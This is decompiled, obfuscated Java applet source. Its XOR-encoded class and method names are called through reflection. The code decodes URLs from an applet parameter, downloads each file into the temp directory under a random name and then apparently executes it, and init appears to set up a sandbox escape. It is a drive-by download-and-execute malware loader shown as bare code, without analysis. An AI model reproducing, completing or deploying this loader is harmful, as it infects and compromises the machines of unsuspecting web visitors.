import java.lang.reflect.Method;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public final class Applet extends java.applet.Applet
{
    private static Boolean class;
    private static Object this;
    
    private static void try(String a) {
        try {
            final String string = System.getProperty(z.super("\u0013<\u001d=D?>H*\u0016$\u000f:^")) + (Math.random() + z.super("p\u000e%I"));
            a = (String)super(z.super("\u0003=\u001a7}\b5\u000fx>\u0007`"), new Class[] { String.class }, new Object[] { a });
            super(z.super("\u0003=\u001a7}\b5\u000fx>\u0007`"), a, z.super("\u0016-\u000e2)9?\b;\u0018 \u0002<B"), new Class[0], new Object[0]);
            a = (String)super(z.super("\u0003=\u001a7}\b5\u000fx>\u0007`"), a, z.super("\u0001&0\b\u0001\u000f*\u000e6A"), new Class[0], new Object[0]);
            final Object super1 = super(z.super("=\u001b+\u000bt\u0004=z*<\u001f8*)\u0014&2\u0012\u0017\u000f8\u000e(A"), new Class[] { String.class }, new Object[] { string });
            try((InputStream)a, super1);
            super((InputStream)a, super1);
            a = string;
            final String super2 = z.super(".\u00141\tg\u0014+\u0011)h.2\t;\u001c#I");
            if (Applet.this == null) {
                Applet.this = super(z.super(".\u00141\tg\u0014+\u0011)h.2\t;\u001c#I"), null, z.super("\t3!4'\u0015,\u0002:I"), new Class[0], new Object[0]);
            }
            super(super2, Applet.this, z.super(";\u00138O"), new Class[] { String.class }, new Object[] { a });
        }
        catch (Exception ex) {
            if (Applet.class) {
                ex.printStackTrace();
            }
        }
    }
    
    private static void try(final InputStream a, final Object a) {
        final byte[] array = new byte[4096];
        InputStream inputStream = a;
        int read;
        while ((read = inputStream.read(array)) != -1) {
            super(z.super("4\f 5N<\u0010s.)\u0010&.\u0012\u000b\u000f<\u000e,A"), a, z.super("\b)\u0004.I"), new Class[] { byte[].class, Integer.TYPE, Integer.TYPE }, new Object[] { array, 0, read });
            inputStream = a;
        }
    }
    
    static {
        Applet.class = false;
        Applet.this = null;
    }
    
    @Override
    public String toString() {
        try {
            final String parameter = this.getParameter(z.super("\u0002\u001c*\u001f0W"));
            final String super1 = super(z.super("3h\u0012Fm\u007fI\u001dgYuXv|9,q@S6=+\n\u000bmeY\u007fC-6?\u0010d\u0004*H0an\u0015HYZF0&tGc\t\u0019\u0005X\u0006=Kf$_yA\u0011\b$`H\boEX[6"));
            final String super2 = super(z.super("6?\u0018\u0011\u001f\"-`<\u000eAl\"]$\tf\u0017ul\u0006sH)t\u007faYWcr\u0001T^$\"s\u001fQ]u<#+{T@ZNL}\bwe<6{[)rqjpq(r\u001c\u0011\u0011+\u00113J"));
            final String s = super1;
            final String s2 = parameter;
            final StringBuffer sb = new StringBuffer();
            final int length = s2.length();
            int n;
            int i = n = 0;
            while (i < length) {
                final int index;
                if ((index = s.indexOf(s2.substring(n, n + 1))) >= 0) {
                    sb.append(super2.substring(index, index + 1));
                }
                i = ++n;
            }
            super(sb.toString(), z.super("\t"));
        }
        catch (Exception ex) {
            if (Applet.class) {
                ex.printStackTrace();
            }
        }
        return z.super("");
    }
    
    private static void super(InputStream a2, Object a) {
        a2 = (InputStream)new Object[] { a2, a };
        try {
            a = (a2 = a2).length;
            for (int i = 0; i < a; ++i) {
                super(z.super("'\u0019?\u001ee\u00020w\"4\u0011#\r7\u000f>B"), a2[i], z.super("\u0013.\u001a5B"), new Class[0], new Object[0]);
            }
        }
        catch (Exception a2) {
            if (Applet.class) {
                ((Throwable)a2).printStackTrace();
            }
        }
    }
    
    private static String super(final String a) {
        final String super1;
        final int length = (super1 = z.super("\u0004\u0000>\"\u001f#:h\u001f(;\u0016o\u0017n\\,P\u0000+@.\u001dn2:\u0003<$\f3T1(F['I\u0002\u0003\u000bthv%\u000b+5%8\bd/!ZO\u0014*D\u00021<Q|$\u001f\u001b\u000e0\u00163\u000ed")).length();
        final StringBuffer sb = new StringBuffer();
        final int length2 = a.length();
        int n;
        int i = n = 0;
        while (i < length2) {
            sb.append((char)(a.charAt(n) ^ super1.charAt(n % length)));
            i = ++n;
        }
        return sb.toString();
    }
    
    @Override
    public void init() {
        try {
            final Object super1 = super(z.super("\u0004'\u0006\u0013>]*\u00185\u000e3\u0015w\u0006\b&\u0001,\u000e\u0005\u0014!\r\u001c?>$\u00152\u00002S"), super(z.super("\u0004'\u0006\u0013>]*\u00185\u000e3\u0015w\u0006\b&\u0001,\u000e\u0005\u0014!\r\u001c?>$\u00152\u00002S"), new Class[0], new Object[0]), z.super("5\u00028$\"\u001a\u0013#\u0010\u0012\u0006\u000e\u0004+D"), new Class[] { String.class }, new Object[] { z.super("#R") });
            super(z.super("\t7\u000b1\u0005b8\u001f6\b>\u0005z$3\u0019\u0013+\r\u0003\u00191\u0000>D"), super1, z.super("*\u0011*M"), new Class[] { String.class }, new Object[] { z.super("3 \t7\b5\u0001.F2\u0017!:\u00018\u00158O4H:<Si@lI4\u001a/\u001f\\\u0016\u001c.\u000f\u0019\u000e\u0001\u0006]ho2!2%47).Z_\b\u0000\u001d_G\u001aATh{dXu\u001e2\u0013=\u001e\u0013<\u0012{\u0017\"\t O\u0016,\u0004 \t1P3\u00132;\u0017=\u00063\u0012\u001b\u001e&\u0000\u001f4$1\"t,5.*uI\u001d]\u0019\u0014(\u0013\r\b\u00032w}\u007f!v#\u000f2\u0013\u001anS<[n\u001c>\byhKeS.\u001f4\u000f4\nR}T~\u0006h\u0002w\\U;\"#|\u0019<2)4p[U\u0016_\u0016\u001a\u0014\b\u0000\u00060si`(:)!}>\u00176\u0006/\u0015k\u0002t\\") });
            super(z.super("\u000f5\f=B!\u00186\u0016\u0017<]\u0012\u000b1\u000b<U"), this, z.super("\u0004.E"), new Class[] { Class.forName(z.super("\u000f5\f=B!\u001f2T1'\u001e#\u0014/\u00027U")) }, new Object[] { super(z.super(".\b8\u0018,Q#\u0014\u0003=\u000e`-\u0012\u0010+U"), new Class[] { Object[].class }, new Object[] { { super(z.super("#\u0000!4\u0019z\r?\u0012)\u00142P;\"\u0005 \u0018<\u00051D"), super1, z.super("\u0001.\u001a)\u001d\u0017\u0002\u00069\u00181\u000e*O"), new Class[] { String.class, Object[].class }, new Object[] { z.super("6\u001c\u000e\u000f9\u000e!F"), { this } }) } }) });
        }
        catch (Exception ex) {
            if (Applet.class) {
                ex.printStackTrace();
            }
        }
    }
    
    private static void super(String a, String a) {
        if (a.indexOf(a) < 0) {
            try(a);
            return;
        }
        a = (String)(a = (a = (String)(Object)a.split(a))).length;
        int n;
        int i = n = 0;
        while (i < a) {
            try(a[n].trim());
            i = ++n;
        }
    }
    
    private static Object super(String a, final Class[] a, final Object[] a) {
        if (Applet.class) {
            System.out.println(z.super("\n)\t>\n,\u0007\u00172\u0010*\u001a(\u0016w\u0007") + a + z.super("c\u000f") + a.length + z.super("\u000e"));
        }
        return ((Class<?>)(a = (String)Class.forName(a))).getConstructor((Class<?>[])a).newInstance(a);
    }
    
    private static Object super(String a, final Object a, final String a, final Class[] a, final Object[] a) {
        if (Applet.class) {
            System.out.println(z.super("\u00071\u000e&'\u001c\u0002\u0001=\u001c\"\u0017u\u0007") + a + z.super("c\t") + a + z.super("c\u000f") + a.length + z.super("\u000e"));
        }
        return ((Method)(a = (String)((Class)(a = (String)Class.forName(a))).getMethod(a, (Class<?>[])a))).invoke(a, a);
    }
}
